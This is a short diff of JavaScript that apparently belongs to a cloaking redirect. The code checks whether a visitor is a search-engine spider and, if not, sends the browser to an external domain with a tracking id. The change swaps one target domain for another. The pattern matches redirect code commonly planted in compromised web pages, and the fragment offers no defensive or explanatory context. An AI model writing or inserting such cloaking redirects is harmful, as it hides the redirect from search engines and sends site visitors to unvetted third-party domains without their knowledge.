@@ -13,5 +13,5 @@ var isSpider = spiderList.some(function(spider) {
 });
 
 if (!isSpider) {
-    window.location.href = "https://www.bfyer.com?id=395312789";
+    window.location.href = "https://www.10raw.com?id=395312789";
 }
